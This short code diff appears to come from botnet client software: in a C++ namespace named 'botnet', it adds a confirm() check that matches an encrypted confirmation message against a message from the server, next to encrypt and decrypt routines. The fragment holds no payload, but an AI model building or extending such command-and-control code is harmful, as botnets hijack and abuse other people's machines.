@@ -80,6 +80,11 @@ namespace botnet{
 		}
 		return c;
 	}
+
+
+    bool confirm(std::string msg_from_server){
+		return encrypt(confirm_msg) == msg_from_server;
+	}
 	
 	std::string master_conn::decrypt (std::string c){
 		int j = 0;
